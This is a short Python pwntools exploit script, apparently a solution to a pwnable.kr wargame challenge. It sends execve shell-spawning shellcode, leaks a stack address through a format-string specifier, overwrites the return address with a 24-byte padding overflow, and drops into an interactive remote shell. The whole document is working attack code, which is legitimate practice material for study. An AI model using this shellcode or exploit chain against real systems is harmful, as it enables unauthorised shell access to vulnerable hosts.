from pwn import *


shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"\
    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload = 'A'* 24
p = remote('pwnable.kr', 9011)
p.sendline(shellcode)
p.sendline('2')
p.sendline('%10$llx')
p.recvuntil('hello ')
p.readline()
addr = int(p.recv(13), 16)
ret_addr = addr - 0x20
print (hex(addr))
p.sendline('4')
p.sendline('n')
p.sendline('3')
p.sendline(payload + p64(ret_addr))
p.sendline('2')
p.interactive()
#p.sendline(payload + p64(ret_addr) + shellcode )
#p.interactive()

